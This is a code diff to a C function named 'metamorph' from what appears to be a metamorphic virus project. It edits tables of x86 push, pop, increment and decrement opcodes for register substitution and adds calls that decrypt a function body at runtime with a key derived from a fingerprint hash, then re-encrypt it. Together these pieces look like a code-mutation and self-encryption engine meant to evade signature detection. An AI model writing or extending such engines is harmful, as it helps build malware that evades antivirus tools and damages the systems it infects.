@@ -16,11 +16,13 @@ unsigned char	hash_fingerprint(int fingerprint, int nb)
 
 void			metamorph(t_info *info, t_fingerprint *fingerprint)
 {
-	uint32_t	tab_push[15];
-	uint32_t	tab_pop[15];
-	uint32_t	tab_inc[15];
-	uint32_t	tab_dec[15];
-	size_t		tab_offset[17];
+	uint32_t	tab_push[16];
+	uint32_t	tab_pop[16];
+	uint32_t	tab_inc[16];
+	uint32_t	tab_dec[16];
+	size_t		tab_offset[18];
+// 	char c = 'c';
+// 	ft_syswrite(1, &c, 1);
 
 	tab_push[0] = 0x50; //rax
 	tab_push[1] = 0x51; //rcx
@@ -114,6 +116,7 @@ void			metamorph(t_info *info, t_fingerprint *fingerprint)
 	unsigned char	ret = 0;
 	unsigned char	i_regs = 0;
 	unsigned char	i_tab = 0;
+	uint32_t key = decrypt_func(info, &hash_fingerprint, info->tab_addr[21] - info->tab_addr[20], 20);
 
 	while (i < 18)
 	{
@@ -138,5 +141,6 @@ void			metamorph(t_info *info, t_fingerprint *fingerprint)
 		}
 		i++;
 	}
+	reencrypt_func(info, &hash_fingerprint, info->tab_addr[21] - info->tab_addr[20], key);
 	return ;
 }
